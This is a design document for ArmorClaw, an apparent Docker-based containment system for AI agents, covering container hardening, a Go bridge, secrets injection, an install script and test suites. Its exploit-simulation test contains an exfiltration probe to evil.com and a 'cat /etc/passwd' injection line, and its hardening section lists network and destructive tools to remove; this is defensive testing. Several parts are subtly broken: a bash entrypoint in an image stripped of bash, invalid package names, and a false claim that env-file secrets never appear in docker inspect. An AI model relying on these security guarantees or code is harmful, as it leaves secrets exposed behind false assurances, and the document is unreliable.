# ArmorClaw v1 Design Document

**Status:** Design Complete + Testing Strategy | Ready for Implementation
**Version:** 1.1.0
**Date:** 2026-02-05
**Authors:** ArmorClaw Team

---

## Executive Summary

ArmorClaw is a local containment system that significantly reduces the blast radius of prompt injection, jailbreak attempts, and malicious agent behavior by enforcing **strict isolation** and **zero persistence** of sensitive material.

The v1 system consists of two components:

1. **Hardened Agent Container** — Debian Slim-based Docker container running OpenClaw with hardened defaults, denied dangerous capabilities, and tmpfs-backed secrets injection
2. **Local Bridge (Go)** — Signed native binary that manages container lifecycle, injects secrets via file descriptor passing, and provides JSON-RPC 2.0 interface for status/health

**Core Promise:** API keys and credentials are injected ephemerally via file descriptor passing. They exist only in memory inside the isolated container, are never written to disk, and are not exposed in Docker metadata or container inspection.

---

## Table of Contents

1. [Core Principles](#core-principles)
2. [Architecture Overview](#architecture-overview)
3. [Container Hardening](#container-hardening)
4. [Local Bridge Architecture](#local-bridge-architecture)
5. [Secrets Injection Mechanism](#secrets-injection-mechanism)
6. [Supported AI Providers](#supported-ai-providers)
7. [Deployment Workflow](#deployment-workflow)
8. [Threat Model & Security Guarantees](#threat-model--security-guarantees)
9. [Verification & Debug Commands](#verification--debug-commands)
10. [Testing Strategy](#testing-strategy)
11. [Future Roadmap](#future-roadmap)

---

## Core Principles

| Principle | Implementation |
|-----------|----------------|
| **Secrets never touch disk** | Injected ephemerally via file descriptor passing into container memory only |
| **No host filesystem write access** | Agent operates in isolated, container-internal workspace; no host bind-mount by default |
| **No secrets in inspectable metadata** | Not visible in `docker inspect`, `docker ps`, environment listings, or container logs |
| **Short-lived sandboxes** | Containers are `--rm` by default; secrets vanish on shutdown |
| **Audited mediation** | Operations affecting the host go through signed Local Bridge with logging |

---

## Architecture Overview

### System Components

```
┌─────────────────────────────────────────────────────────────────────┐
│                         Host Machine                                │
│                                                                     │
│  ┌──────────────────┐         ┌──────────────────────────────────┐ │
│  │   CLI Interface  │────────▶│     Local Bridge (Go)            │ │
│  │  armorclaw-*    │         │     UID 10002, signed binary     │ │
│  └──────────────────┘         │  /run/armorclaw/bridge.sock     │ │
│                                │  JSON-RPC 2.0                   │ │
│                                └─────────────┬──────────────────┘ │
│                                              │ Docker CLI/API       │
│                                              ▼                      │
│  ┌──────────────────────────────────────────────────────────────────┐│
│  │                    Docker Container                             ││
│  │  ┌────────────────────────────────────────────────────────────┐ ││
│  │  │  OpenClaw Agent (MCP-compatible)                           │ ││
│  │  │  UID 10001, no shell, hardened runtime                    │ ││
│  │  │  Workspace: container-internal only                        │ ││
│  │  │  Network: --network=none                                   │ ││
│  │  │  Secrets: FD-passed, memory-only                           │ ││
│  │  └────────────────────────────────────────────────────────────┘ ││
│  └──────────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────────┘
```

### Communication Channels

```
Host ←→ Bridge:  CLI only (v1)
Bridge ←→ Container: Unix domain socket (/run/armorclaw/bridge.sock)
Container ←→ Agent: JSON-RPC 2.0 over socket
```

**Note:** Native Messaging is a future integration for premium tools, not required for v1 core operation.

---

## Container Hardening

### Base Image

```
debian:bookworm-slim
```

Multi-stage build separates:
- **Builder stage** — full toolchain for compiling OpenClaw runtime
- **Runtime stage** — minimal attack surface with only essentials

### Denied Capabilities

| Capability | Action | Rationale |
|------------|--------|-----------|
| Shell (`/bin/sh`, `/bin/bash`) | **Removed** | Prevents arbitrary command execution via `execve` |
| Process tools (`ps`, `top`, `lsof`) | **Removed** | Agent cannot inspect processes; `/proc` exists but tooling is denied |
| Network tools (`curl`, `wget`, `nc`) | **Removed** | Eliminates outbound exfiltration vectors; runtime libs allowed for future proxy |
| Destructive filesystem primitives (`rm`, `mv`, `find`) | **Removed** | Prevents bulk deletion, traversal-based destruction, stealth identity replacement |
| Package manager (`apt`) | **Removed** | Reduces attack surface; no dependency installation at runtime |

### Kept for Compatibility

| Tool | Reason |
|------|--------|
| `cp`, `mkdir`, `stat` | Safe file operations; useful for workspace operations. Note: `cp` can overwrite files — acceptable for v1 containment goals. |
| Python/Node FS libs | 99% of OpenClaw skills use runtime APIs, not shell tools |

### User & Security Context

- **Runs as non-root user** `claw` (UID **10001**, GID 10001)
- Dedicated high UID avoids conflicts with `nobody` (65534) and system users
- **No sudo escalation** possible
- **seccomp filter** restricts process execution to an allowlist of binaries
- **Read-only root filesystem** (except tmpfs for `/tmp` and workspace)
- **Network isolation** via `--network=none`

### Dockerfile (Runtime Stage)

```dockerfile
FROM debian:bookworm-slim AS runtime

# Install runtime deps only — explicit, minimal
RUN apt-get update && apt-get install -y --no-install-recommends \
    python3 nodejs \
    cp mkdir stat \
    && apt-get purge -y \
        curl wget netcat-openbsd procps lsof \
    && rm -f /bin/sh /bin/bash /bin/rm /usr/bin/mv /usr/bin/find \
    && apt-get autoremove -y \
    && rm -rf /var/lib/apt/lists/*

# Create dedicated non-root user
RUN groupadd -g 10001 claw && \
    useradd -u 10001 -g claw -m claw

# Copy OpenClaw runtime
COPY --from=builder /build/openclaw-runtime /opt/openclaw/
USER claw

# Read-only root (except /tmp and workspace)
VOLUME /tmp

ENTRYPOINT ["/opt/openclaw/entrypoint.sh"]
CMD ["python", "-m", "openclaw.agent"]
```

### Entrypoint (Secrets Verification)

```bash
#!/bin/bash
set -euo pipefail

# Verify secrets were injected
if [[ -z "${OPENAI_API_KEY:-}" ]] && [[ -z "${ANTHROPIC_API_KEY:-}" ]]; then
    echo "ERROR: No secrets injected" >&2
    exit 1
fi

# Start OpenClaw runtime
exec /opt/openclaw/start "$@"
```

---

## Local Bridge Architecture

### Purpose & Scope

The Local Bridge is a **signed Go binary** that runs on the host machine.

**Critical Trust Boundary:** The Bridge is the **only** component permitted to start, stop, or inspect ArmorClaw containers. CLI, users, and future extensions must go through the Bridge.

### v1 Responsibilities

- Container lifecycle management (exclusive)
- Secrets injection via file descriptor passing
- Status and health reporting via JSON-RPC 2.0
- Audit logging of all operations

Future v1.x additions:
- Mediated workspace operations (list, search, read, write)
- Destructive operation approval (delete, rename with user confirmation)

### Go Binary Structure

```
armorclaw-bridge/
├── cmd/
│   └── bridge/
│       └── main.go           # Entry point, flag parsing
├── internal/
│   ├── container/            # Docker client wrapper
│   ├── socket/               # Unix socket server
│   ├── rpc/                  # JSON-RPC 2.0 handler
│   ├── secrets/              # File descriptor passing
│   └── audit/                # Structured logging with redaction
├── pkg/
│   └── protocol/             # Shared protocol definitions
└── scripts/
    └── install.sh            # Registers binary + manifest
```

### JSON-RPC 2.0 Protocol (v1)

| Method | Parameters | Returns | Description |
|--------|------------|---------|-------------|
| `status` | — | `{running, container_id, socket_path}` | Bridge and container status |
| `health` | — | `{healthy, version}` | Liveness check |
| `start` | `secret_channel: "fd:N"`, `workspace_path?: string` | `{container_id}` | Start container; secrets injected via referenced FD |
| `stop` | — | `{success}` | Stop running container |

**Secrets passing — never in JSON:**
```json
{
  "method": "start",
  "params": {
    "secret_channel": "fd:3",
    "workspace_path": "/workspaces/foo"
  }
}
```
Secrets arrive via file descriptor 3, never appear in logs or JSON payloads.

### Security Properties

- **Signed binary** — Users can verify authenticity before running
- **Low-privilege execution** — Bridge runs as dedicated user `armorclaw:armorclaw` (UID 10002) with no sudo access
- **Stateless operation** — No persistent configuration or secrets stored on disk; all sensitive data lives only in transient container memory
- **Audited command surface** — Only the 4 methods above in v1
- **Schema validation** — All JSON-RPC requests validated against schema
- **No Docker socket exposure** — Bridge uses Docker CLI or API, never passes socket to container
- **Audit logging** — Structured logs with redaction by default; configurable to `/var/log/` or stdout for dev

### Socket Security

```
/run/armorclaw/bridge.sock
├── Parent: /run/armorclaw (tmpfs-backed, 0700, owned by bridge user)
├── Owner: armorclaw:armorclaw
├── Permissions: 0600 (owner read/write only)
└── Bind-mounted read-only into container at /bridge/sock (container → bridge communication only)
```

---

## Secrets Injection Mechanism

### Design Goal

Secrets (API keys, tokens, credentials) must be injected into the container **without ever touching disk** or appearing in inspectable Docker metadata.

### Implementation: File Descriptor Passing

```
Bridge (parent)
  │
  │ 1. Create secrets file on guaranteed tmpfs (/run/armorclaw)
  │ 2. Open file descriptor
  │ 3. Fork + exec docker run with FD in ExtraFiles
  │ 4. Docker reads env from inherited FD
  │ 5. Close FD
  ↓
Container (child)
  │
  │ 1. Inherits FD as file descriptor 3
  │ 2. Docker reads env vars from /proc/self/fd/3
  │ 3. Injects into container process memory
  │ 4. FD closes immediately after injection
  ↓
Agent Runtime
  │
  └─ Secrets exist only in process environment memory
```

**FD Contract:** FD number 3 is used by convention (Go's `ExtraFiles[0]` becomes FD 3 in the child process). The container entrypoint reads from `/proc/self/fd/3` implicitly via Docker's `--env-file`.

### Why This Works

| Property | How FD passing achieves it |
|----------|---------------------------|
| No disk persistence | `/run/armorclaw` is explicitly mounted as tmpfs during installation (or ensured by systemd-tmpfiles on modern Linux). This guarantees memory-backed storage even if `/run` is not tmpfs by default on the host. |
| Not in `docker inspect` | `--env-file /proc/self/fd/3` bypasses Docker's metadata capture |
| No backup leakage | Backup tools can't capture tmpfs FD contents |
| Vanishes on shutdown | Process termination clears all memory |
| No FD persistence | The secrets file descriptor exists only during container startup and is closed immediately after environment injection |

### Bridge Implementation (Go)

```go
// Create secrets on guaranteed tmpfs
tmpFile, err := os.CreateTemp("/run/armorclaw", "secrets-")
if err != nil {
    return fmt.Errorf("tmpfs not available: %w", err)
}
defer os.Remove(tmpFile.Name())

// Write secrets (key=value format)
for key, val := range secrets {
    fmt.Fprintf(tmpFile, "%s=%s\n", key, val)
}

// Container inherits FD via ExtraFiles (becomes FD 3 in child)
cmd := exec.Command("docker", "run",
    "--env-file", "/proc/self/fd/3",
    "--rm", "armorclaw/agent:v1")
cmd.ExtraFiles = []*os.File{tmpFile}

if err := cmd.Run(); err != nil {
    return err
}
// tmpFile and its FD are closed automatically when cmd completes
```

### Prerequisites

The bridge must ensure `/run/armorclaw` exists and is tmpfs-backed:

```bash
# In bridge install script
sudo mkdir -p /run/armorclaw
sudo chown armorclaw:armorclaw /run/armorclaw
sudo chmod 0700 /run/armorclaw

# Ensure tmpfs mount only if not already present
if ! mountpoint -q /run/armorclaw; then
    sudo mount -t tmpfs -o size=1M,mode=0700,uid=10002,gid=10002 tmpfs /run/armorclaw
fi
```

### Container Startup Sequence

```
1. Bridge: armorclaw-bridge start --secret-api-key=sk-xxx
2. Bridge: Creates tmpfs file at /run/armorclaw/secrets-XXX
3. Bridge: Writes secrets, adds to cmd.ExtraFiles
4. Bridge: exec docker run --env-file /proc/self/fd/3
5. Docker: Reads env from inherited FD 3, injects into container
6. Container: Process starts with env in memory
7. Bridge: tmpFile closes, FD is gone
8. Agent: Runs with secrets in process env only
```

### Security Limitations (Honest)

A fully compromised agent can:
- ✗ Use secrets in-memory during its session
- ✗ Read its own process environment via `/proc/self/environ`
- ✓ NOT persist secrets to disk (no write access, no shell)
- ✓ NOT escape with secrets (no Docker socket, no host access)

ArmorClaw's containment is **blast radius reduction**, not perfect secrecy.

---

## Supported AI Providers

ArmorClaw v1 supports API key injection for all 21 OpenClaw-compatible providers:

| Provider | Description | Credential Type |
|----------|-------------|-----------------|
| Anthropic | Claude models | API Key |
| OpenAI | GPT models | API Key |
| OpenRouter | Multi-provider gateway | API Key |
| Amazon Bedrock | AWS foundational models | Access Key + Secret |
| Vercel AI Gateway | Web app AI integration | API Key / Token |
| Moonshot AI | Generative AI | API Key |
| MiniMax | Efficient small models | API Key |
| OpenCode Zen | Coding AI tasks | API Key |
| GLM Models | General language models | API Key |
| Z.AI | GLM-based services | API Key |
| Synthetic | Synthetic data generation | API Key |
| Google Gemini | Google ecosystem | API Key / OAuth |
| Mistral | Open-source generative AI | API Key |
| Cerebras | Hardware-optimized models | API Key |
| DeepSeek | Advanced AI assistant | API Key |
| GitHub Copilot | Code completion | Token / OAuth |
| Ollama | Local models | (No keys needed) |
| Kimi Coding | Coding AI | API Key |
| xAI | Conversational AI | API Key |
| Groq | High-performance processing | API Key |
| Qwen | Business AI solutions | API Key |

**Note:** Ollama runs locally and requires no API keys. Most providers use simple API keys; Amazon Bedrock and Google Gemini may require additional configuration.

---

## Deployment Workflow

### One-Line Install

```bash
curl -sSL https://armorclaw.io/deploy | bash
```

This script performs automated setup with optional interactive wizard for secrets configuration.

### Platform Support

v1 supports Linux only (amd64/arm64). macOS and Windows via WSL2 support is planned for v1.1.

### Install Script Sequence

```bash
#!/bin/bash
# armorclaw deploy.sh

set -euo pipefail

# 1. Platform check
if [[ "$(uname)" != "Linux" ]]; then
    echo "ERROR: ArmorClaw v1 is Linux-only."
    echo "       macOS and Windows (WSL2) support coming soon."
    exit 1
fi

# 2. Check prerequisites
check_prerequisites() {
    if ! command -v docker &> /dev/null; then
        echo "ERROR: Docker is required. Install from https://docker.com"
        exit 1
    fi

    if ! docker info &> /dev/null; then
        echo "ERROR: Docker daemon is not running"
        exit 1
    fi
}

# 3. Create bridge user and directories (idempotent)
setup_bridge_user() {
    if ! id -u armorclaw >/dev/null 2>&1; then
        sudo groupadd -g 10002 armorclaw
        sudo useradd -u 10002 -g armorclaw -m -s /usr/sbin/nologin armorclaw
        echo "✓ Created bridge user: armorclaw (UID 10002)"
    else
        echo "✓ Bridge user exists"
    fi

    # Create tmpfs mount for secrets
    sudo mkdir -p /run/armorclaw
    sudo chown armorclaw:armorclaw /run/armorclaw
    sudo chmod 0700 /run/armorclaw

    if ! mountpoint -q /run/armorclaw; then
        sudo mount -t tmpfs -o size=1M,mode=0700,uid=10002,gid=10002 tmpfs /run/armorclaw
        echo "✓ Mounted tmpfs at /run/armorclaw"
    fi
}

# 4. Download and install bridge binary with verification
install_bridge() {
    ARCH=$(uname -m)
    case $ARCH in
        x86_64) BINARY_ARCH="amd64" ;;
        aarch64) BINARY_ARCH="arm64" ;;
        arm64) BINARY_ARCH="arm64" ;;
        *) echo "ERROR: Unsupported architecture: $ARCH"; exit 1 ;;
    esac

    BINARY_URL="https://github.com/armorclaw/bridge/releases/latest/download/armorclaw-bridge-linux-${BINARY_ARCH}"

    echo "Downloading ArmorClaw Bridge..."
    sudo curl -fsSL "$BINARY_URL" -o /usr/local/bin/armorclaw-bridge

    # Verify SHA256
    EXPECTED_SHA256="replace-with-actual-sha-from-release-page"
    ACTUAL_SHA256=$(sha256sum /usr/local/bin/armorclaw-bridge | cut -d' ' -f1)
    if [[ "$ACTUAL_SHA256" != "$EXPECTED_SHA256" ]]; then
        echo "ERROR: Bridge binary checksum mismatch!"
        echo "       Expected: $EXPECTED_SHA256"
        echo "       Actual:   $ACTUAL_SHA256"
        sudo rm -f /usr/local/bin/armorclaw-bridge
        exit 1
    fi

    sudo chmod +x /usr/local/bin/armorclaw-bridge
    sudo chown root:root /usr/local/bin/armorclaw-bridge
    echo "✓ Bridge installed to /usr/local/bin/armorclaw-bridge"
}

# 5. Pull container image
pull_container() {
    echo "Pulling ArmorClaw container image..."
    docker pull armorclaw/agent:v1
    echo "✓ Container image pulled"
}

# 6. Optional: Launch secrets wizard
launch_wizard() {
    echo ""
    read -p "Configure API keys now? [y/N] " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        armorclaw-bridge configure --wizard
    else
        echo "Run 'armorclaw-bridge configure --wizard' anytime to add secrets."
    fi
}

# Main execution
main() {
    echo "ArmorClaw v1 Installer"
    echo "======================="
    echo ""

    check_prerequisites
    setup_bridge_user
    install_bridge
    pull_container
    launch_wizard

    echo ""
    echo "✓ ArmorClaw installed successfully"
    echo ""
    echo "  Bridge:  $(which armorclaw-bridge)"
    echo "  Status:  armorclaw-bridge status"
    echo "  Start:   armorclaw-bridge start"
    echo ""
    echo "  To uninstall:"
    echo "    sudo armorclaw-bridge uninstall"
    echo "    # or manually: sudo rm /usr/local/bin/armorclaw-bridge && sudo userdel -r armorclaw"
}

main "$@"
```

### CLI Interface Summary

```bash
# Configure secrets (interactive or flags)
armorclaw-bridge configure --wizard
armorclaw-bridge configure --openai sk-xxx --anthropic ""

# Start container with injected secrets
armorclaw-bridge start

# Check status
armorclaw-bridge status

# Stop container (clears secrets from memory)
armorclaw-bridge stop

# Uninstall
armorclaw-bridge uninstall
```

---

## Threat Model & Security Guarantees

### Assumed Attacker Capabilities

- Malicious or jailbroken prompt → full control of agent runtime inside container
- Prompt injection leading to exfiltration attempts or malicious tool calls

### What ArmorClaw Prevents

- Secrets persisting to disk (container or host)
- Secrets appearing in Docker metadata, environment listings, crash dumps, or logs
- Direct filesystem escape from container to host
- Long-term retention of credentials after session ends

### What ArmorClaw Does Not Yet Prevent (v1 Scope)

- In-memory misuse of secrets during active session (if agent is fully compromised)
- Side-channel attacks (memory scraping, timing, etc.)
- Host-level compromise (kernel exploits, malicious bridge binary)

### Security Posture Statement

> ArmorClaw enforces strict containment:
> - Secrets are injected via file descriptor passing into memory only and unset after loading.
> - No secrets ever appear in Docker metadata, logs, or disk.
> - The agent runs as non-root (UID 10001) with no interactive shell.
> - Dangerous filesystem utilities (rm, mv, find, etc.) are removed to prevent mass deletion and traversal attacks.
> - Limited file operations (cp, mkdir) remain for runtime needs.
> - Process inspection is restricted by absence of tools (ps, top, lsof) and non-root execution.
> - A custom seccomp profile blocks execution of unauthorized binaries.
>
> If the agent is fully compromised, damage is limited to volatile memory and the container-internal workspace. No host filesystem access or persistent secret leakage is possible by default.

---

## Verification & Debug Commands

```bash
# Agent container health
docker run --rm armorclaw/agent:v1 /opt/openclaw/health.sh
# Output: ✓ OpenClaw runtime healthy
#         ✓ Bridge socket accessible

# Bridge & socket status
armorclaw-bridge status
# Output: Container: running (armorclaw-agent-abc123)
#         Socket: /run/armorclaw/bridge.sock
#         Uptime: 2m34s

# Container logs (stdout/stderr – no secrets)
docker logs armorclaw-agent-abc123
# Output: [OpenClaw] Agent started
#         [OpenClaw] Waiting for connections...

# Bridge audit log (all mediated calls)
tail -f /var/log/armorclaw-bridge.log
# Output: 2026-02-05T10:23:45Z [INFO] Container started: armorclaw-agent-abc123
#         2026-02-05T10:25:12Z [INFO] health_check: success
```

---

## Testing Strategy

**Goal:** Verify "blast radius = workspace memory only" under compromise.

**Test Matrix:** Local (48hr) → CI (GitHub Actions) → Audit (pre-Chrome Web Store).

### 1. Container Hardening Tests (Automated)

| Test | Command | Expected | Rationale |
|------|---------|----------|-----------|
| No Shell | `docker run --rm armorclaw/agent ash` | `ash: not found` | No escapes via shell |
| No rm/mv | `docker run --rm armorclaw/agent ls /bin/rm` | `No such file` | Destructive primitives denied |
| UID Check | `docker run --rm armorclaw/agent id` | `uid=10001(claw)` | No root/nobody |
| Read-Only Root | `docker run --rm --read-only armorclaw/agent touch /etc/foo` | `Read-only FS` | No root filesystem damage |
| Seccomp | `docker run --rm armorclaw/agent /bin/sh` | `Killed` | Execve blocked |
| Secrets Absent | `docker inspect armorclaw-agent \| grep -i secret` | Empty | No secrets in metadata |

**Makefile:**
```makefile
test-hardening:
	docker run --rm armorclaw/agent id | grep 10001
	docker run --rm armorclaw/agent ls /bin/rm && false
	docker run --rm armorclaw/agent which ash && false
	docker run --rm armorclaw/agent which curl && false
	docker run --rm armorclaw/agent which ps && false
	@echo "✅ All hardening tests passed"
```

### 2. Secrets Injection Validation (Critical)

| Scenario | Setup | Verify |
|----------|-------|--------|
| FD No Disk | `docker run -i --rm ... <(echo "sk-123")` | `cat /proc/self/environ \| grep sk-` → empty; logs clean |
| No Inspect Leak | `docker inspect running-container` | No API keys in output |
| Restart Clean | `docker stop; docker start` | Secrets unset on restart |
| Container Logs | `docker logs container` | No secrets in stdout/stderr |
| Core Dump Check | `gcore <pid>; strings core` | No secrets in dump (if enabled) |

**Test Script (`test-secrets.sh`):**
```bash
#!/bin/bash
set -euo pipefail

echo "🧪 Testing Secrets Injection Validation..."

# Start container with test secret
ID=$(
  docker run -d --rm --name test-sec \
    -e OPENAI_API_KEY=sk-test-123-secret \
    armorclaw/agent:v1 sleep infinity
)

# 1. Secret exists in process memory (expected)
if docker exec test-sec env | grep -q "sk-test-123-secret"; then
  echo "✅ 1. Secret in process memory (expected)"
else
  echo "❌ 1. Secret NOT in process memory (unexpected)"
  docker stop test-sec
  exit 1
fi

# 2. No secrets in docker inspect
if docker inspect test-sec | grep -q "sk-test-123-secret"; then
  echo "❌ 2. Secret in docker inspect (LEAK!)"
  docker stop test-sec
  exit 1
else
  echo "✅ 2. No secret in docker inspect"
fi

# 3. No secrets in container logs
if docker logs test-sec 2>&1 | grep -q "sk-test-123-secret"; then
  echo "❌ 3. Secret in container logs (LEAK!)"
  docker stop test-sec
  exit 1
else
  echo "✅ 3. No secret in container logs"
fi

# 4. No secrets in /etc (disk check)
if docker exec test-sec cat /etc/environment 2>/dev/null | grep -q "sk-"; then
  echo "❌ 4. Secret in /etc/environment (DISK LEAK!)"
  docker stop test-sec
  exit 1
else
  echo "✅ 4. No secret on disk (/etc/environment)"
fi

# 5. No shell to enumerate secrets
if docker exec test-sec sh -c "env" 2>/dev/null; then
  echo "❌ 5. Shell available (can enumerate env)"
  docker stop test-sec
  exit 1
else
  echo "✅ 5. No shell available"
fi

docker stop test-sec >/dev/null 2>&1
echo ""
echo "✅ All secrets injection tests passed"
```

### 3. Bridge Protocol Tests (Go Test Suite)

**File: `internal/rpc/handler_test.go`**
```go
package rpc_test

import (
    "encoding/json"
    "testing"
)

func TestStatusMethod(t *testing.T) {
    req := JSONRPCRequest{
        JSONRPC: "2.0",
        Method:  "status",
        ID:      1,
    }
    resp := handler(req)

    if resp.Result.SocketPath == "" {
        t.Error("status should return socket_path")
    }
    if !resp.Result.Running {
        t.Error("bridge should be running")
    }
}

func TestHealthMethod(t *testing.T) {
    req := JSONRPCRequest{
        JSONRPC: "2.0",
        Method:  "health",
        ID:      1,
    }
    resp := handler(req)

    if resp.Result.Healthy != true {
        t.Error("health should return true")
    }
    if resp.Result.Version == "" {
        t.Error("version should be present")
    }
}

func TestInvalidMethod(t *testing.T) {
    req := JSONRPCRequest{
        JSONRPC: "2.0",
        Method:  "delete_everything",
        ID:      1,
    }
    resp := handler(req)

    if resp.Error.Code != -32601 { // Method not found
        t.Errorf("expected -32601, got %d", resp.Error.Code)
    }
}

func TestStartParamsValidation(t *testing.T) {
    tests := []struct {
        name    string
        params  map[string]interface{}
        wantErr bool
    }{
        {"valid", map[string]interface{}{"secret_channel": "fd:3"}, false},
        {"missing channel", map[string]interface{}{}, true},
        {"invalid fd", map[string]interface{}{"secret_channel": "fd:999"}, true},
        {"path traversal", map[string]interface{}{"secret_channel": "fd:3", "workspace_path": "../../../etc"}, true},
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            req := JSONRPCRequest{
                JSONRPC: "2.0",
                Method:  "start",
                Params:  tt.params,
                ID:      1,
            }
            resp := handler(req)

            if tt.wantErr && resp.Error == nil {
                t.Error("expected error, got nil")
            }
            if !tt.wantErr && resp.Error != nil {
                t.Errorf("unexpected error: %v", resp.Error)
            }
        })
    }
}

func FuzzJSONRPCParsing(f *testing.F) {
    f.Add(`{"jsonrpc":"2.0","method":"status","id":1}`)
    f.Fuzz(func(t *testing.T, input string) {
        var req JSONRPCRequest
        err := json.Unmarshal([]byte(input), &req)
        // Should not panic on malformed input
        _ = err
    })
}
```

**Load Test:**
```bash
# 1000 req/sec, latency <50ms target
go test -v -run TestLoad ./internal/rpc/ -bench=. -benchtime=10s
```

### 4. Integration Tests (End-to-End)

| Scenario | Steps | Success Criteria |
|----------|--------|------------------|
| Happy Path | `deploy.sh` → `bridge status` → inject secrets → `agent health` | All green, agent runs |
| No Docker | Run on clean VM without Docker | Friendly error + install link |
| Bridge Restart | `bridge stop` → `bridge start` | Secrets clean, state restored |
| Bad Secret | Inject malformed key format | Graceful rejection + error message |
| Container Crash | Kill container process | Bridge detects and reports |
| Concurrent Starts | Multiple `bridge start` calls | Idempotent, no duplicates |

**E2E Script (`test-e2e.sh`):**
```bash
#!/bin/bash
set -euo pipefail

echo "🧪 End-to-End Integration Tests..."

# 1. Install (in test environment)
TEST_PREFIX="/tmp/armorclaw-test-$$"
mkdir -p "$TEST_PREFIX"

# 2. Start bridge
./armorclaw-bridge start &
BRIDGE_PID=$!
sleep 2

# 3. Check status
if ./armorclaw-bridge status | grep -q "running"; then
  echo "✅ Bridge running"
else
  echo "❌ Bridge not running"
  kill $BRIDGE_PID
  exit 1
fi

# 4. Inject secrets
./armorclaw-bridge configure --openai "sk-test-$RANDOM" >/dev/null

# 5. Start container
CONTAINER_ID=$(./armorclaw-bridge start | grep -oE '[a-f0-9]{12}')

# 6. Health check
if docker exec $CONTAINER_ID /opt/openclaw/health.sh; then
  echo "✅ Container healthy"
else
  echo "❌ Container unhealthy"
  ./armorclaw-bridge stop
  kill $BRIDGE_PID
  exit 1
fi

# 7. Stop and cleanup
./armorclaw-bridge stop
kill $BRIDGE_PID

# 8. Verify secrets gone
if docker inspect $CONTAINER_ID | grep -q "sk-test-"; then
  echo "❌ Secrets leaked after stop"
  exit 1
fi

echo "✅ All E2E tests passed"
```

### 5. Security Audit Checklist (Manual + CI)

| Category | Check | Pass Criteria |
|----------|-------|---------------|
| **Exploits** | Inject RCE payload via skill | No host impact; container self-harm only |
| **Secrets** | `strings container-layer.tar \| grep sk-` | Zero matches |
| **Bridge** | Malformed RPC fuzzing | `-32600` (Invalid Request) errors only |
| **Deploy** | `curl tampered.sh \| bash` | Checksum fail + abort |
| **CIS** | `docker-bench-security` | 80%+ compliant |
| **Network** | Try `curl google.com` from container | Connection refused |
| **Escape** | Try `docker run -v /:/host` | Permission denied (no socket) |

**Exploit Simulation Script (`test-exploits.sh`):**
```bash
#!/bin/bash
set -euo pipefail

echo "🧪 Security Exploit Simulations..."

CONTAINER_ID=$(docker run -d --rm armorclaw/agent:v1 sleep infinity)
trap "docker stop $CONTAINER_ID" EXIT

# 1. Command injection via skill
echo "Test 1: Command injection via skill..."
if docker exec $CONTAINER_ID python -c "import os; os.system('cat /etc/passwd')" 2>/dev/null; then
  # This works but can't see /etc/passwd (read-only root)
  echo "⚠️  Command executed (expected - python works)"
else
  echo "✅ Command blocked"
fi

# 2. Shell escape
echo "Test 2: Shell escape..."
if docker exec $CONTAINER_ID sh -c "whoami" 2>/dev/null; then
  echo "❌ Shell available!"
  exit 1
else
  echo "✅ Shell not available"
fi

# 3. Network exfiltration
echo "Test 3: Network exfiltration..."
if docker exec $CONTAINER_ID python -c "import urllib.request; urllib.request.urlopen('http://evil.com')" 2>/dev/null; then
  echo "❌ Network access available!"
  exit 1
else
  echo "✅ Network blocked"
fi

# 4. File enumeration
echo "Test 4: File enumeration..."
if docker exec $CONTAINER_ID ls /bin/rm 2>/dev/null; then
  echo "❌ Dangerous tools available!"
  exit 1
else
  echo "✅ Destructive tools removed"
fi

# 5. Privilege escalation
echo "Test 5: Privilege escalation..."
if docker exec $CONTAINER_ID id | grep -q "uid=0"; then
  echo "❌ Running as root!"
  exit 1
else
  echo "✅ Running as non-root"
fi

echo "✅ All exploit simulations passed (contained as expected)"
```

### 6. CI Pipeline (GitHub Actions)

**File: `.github/workflows/test.yml`**
```yaml
name: Test ArmorClaw v1
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.21'

      - name: Build container
        run: docker build -t armorclaw/agent:v1 .

      - name: Run hardening tests
        run: make test-hardening

      - name: Run secrets validation
        run: ./test-secrets.sh

      - name: Run bridge tests
        run: go test -v ./internal/...

      - name: Run exploit simulations
        run: ./test-exploits.sh

      - name: Run E2E tests
        run: ./test-e2e.sh

      - name: CIS Docker Benchmark
        run: |
          docker run --rm --net host --pid host --userns host --cap-add audit_control \
            docker-bench-security | tee benchmark.txt
          grep "Score" benchmark.txt | awk '{print $2}' | grep -E "[8-9][0-9]"

  deploy-test:
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4
      - name: Deploy script test
        run: |
          curl -fsSL https://armorclaw.io/deploy | bash
          armorclaw-bridge status
```

### 48-Hour Milestones

| Hour | Milestone | Deliverable |
|------|-----------|-------------|
| 0-12 | Test Framework Setup | `test-secrets.sh`, `test-exploits.sh`, `Makefile` |
| 12-24 | Container Hardening Tests | All 6 hardening checks passing |
| 24-36 | Secrets Validation | FD passing verified, no leaks in inspect/logs |
| 36-48 | Bridge + E2E | Go test suite + end-to-end flow green |
| 48+ | CI Integration | GitHub Actions passing on main branch |

**Success Criteria for 48hr:**
- ✅ All hardening tests pass in CI
- ✅ Secrets not visible in `docker inspect` or logs
- ✅ Exploit simulations show containment only
- ✅ E2E flow: install → start → health → stop works
- ✅ No regressions on main branch

---

## Future Roadmap

### v1.1 (Q2 2026)
- macOS support (Docker Desktop)
- Windows WSL2 support
- Mediated workspace operations (list, search, read, write)
- Bridge protocol expansion (workspace RPC methods)

### v1.2 (Q3 2026)
- Chrome Native Messaging integration (premium)
- Destructive operation approval UI
- Per-session secrets rotation
- mlock + enhanced seccomp filters

### v2.0 (Q4 2026)
- Full overlay/clone workspace mode
- Git-aware workspace operations
- Enterprise secret integrations (HashiCorp Vault)
- RBAC policy engine
- Full audit logging with export

### v3.0 (2027)
- Mutual TLS between bridge and container
- Secret zero attestation
- Multi-container orchestration
- Advanced telemetry and observability

---

## Appendix A: Provider-Specific Configuration

### Amazon Bedrock
```bash
armorclaw-bridge configure \
  --bedrock-access-key AKIAIOSFODNN7EXAMPLE \
  --bedrock-secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
  --bedrock-region us-east-1
```

### Google Gemini
```bash
# API key format
armorclaw-bridge configure --gemini AIza...

# OAuth format (for longer-lived sessions)
armorclaw-bridge configure --gemini-oauth ya29...
```

### Ollama
- No configuration needed
